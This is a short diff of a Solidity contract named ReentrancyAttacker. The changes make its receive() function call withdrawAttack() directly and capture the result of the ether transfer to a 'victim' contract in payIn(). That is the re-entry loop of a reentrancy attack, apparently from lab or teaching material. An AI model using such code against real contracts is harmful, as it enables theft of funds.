@@ -13,11 +13,11 @@ contract ReentrancyAttacker {
 
     receive() external payable {
         counter++;
-        payable(this).call(abi.encodeWithSignature("withdrawAttack()"));
+        withdrawAttack();
     }
 
     function payIn() public returns (bool success) {
-        payable(victim).call{value: amount}(abi.encodeWithSignature("payIn()"));
+        (success, ) = payable(victim).call{value: amount}(abi.encodeWithSignature("payIn()"));
     }
 
     function addAmount() public payable {
